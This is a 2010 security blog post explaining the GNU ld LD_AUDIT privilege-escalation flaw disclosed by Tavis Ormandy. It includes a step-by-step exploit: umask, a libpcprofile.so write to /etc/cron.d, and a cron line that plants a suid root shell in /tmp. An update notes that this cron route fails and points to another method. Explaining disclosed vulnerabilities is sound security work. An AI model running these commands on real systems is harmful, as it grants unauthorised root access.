---
layout: post
title: GNU ld  dlopen privilege escalation
date: '2010-10-22T23:56:00.010+02:00'
author: Xavier Garcia
tags:
- escalation
- Linux
- ld_audit
modified_time: '2010-11-30T11:02:56.093+01:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-7894173933676300250
blogger_orig_url: http://www.shellguardians.com/2010/10/gnu-ld-dlopen-privilege-escalation.html
---
For second time this week, Tavis  Ormandy  has sent a 'bomb' to a [full disclosure list](http://marc.info/?l=full-disclosure&m=128776663124692&w=2) in form of Linux privilege escalation with GNU ld.  
  
In a nutshell, the problem is the following:  
LD_PRELOAD is:  

> A whitespace-separated list of additional, user-specified, ELF shared libraries to be loaded before all others. This can be used to selectively override functions in other shared libraries. For set-user-ID/set-group-ID ELF binaries, only libraries in the standard search directories that are also set- user-ID will be loaded.

But, this is not the case with LD_AUDIT. Basically, you can load any library when executing a suid program, that will be executed with root permissions! The attack consists in finding an arbitrary library that will write a file to disk, that will be owned by root in case of executing a suid program.  
  
  
The final trick is that the newly created process will inherit parent's umask. What does it mean? We can change the umask in our shell and then create a world writeable file with root rights!  
  
A regular user being able to write files with root permissions is really a bad thing...  It means that you can create an arbitrary shell script that will be executed by Cron with root rights.  Yes, an instant root shell in the system!  
  
The attack:  
```
$ umask 0  
#arbitrary suid program  
$ LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/exploit" ping  
# This library writes a file to disk when the PCPROFILE_OUTPUT  
# environment variable is defined.  
# There is another example with the liblftp-tasks library and  
# the LFTP_HOME environment variable.  
$ printf "* * * * * root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit\n" > \  
/etc/cron.d/exploit  
# Create an arbitrary but valid crontab(5) line in the file and wait for the execution  
# This attack creates a suid shell named /tmp/exploit.  
$ /tmp/exploit  
# whoami  
root
```
  
UPDATE:  Using crontab files is not an option because Cron does not accept files that are group or world writable. The attacker must look for other options.  
  
UPDATE: It is possible to upload an [arbitrary library](http://www.shellguardians.com/2010/11/escalation-with-library-upload-gnu-ld.html) that will be loaded with root privileges, dropping a root shell.
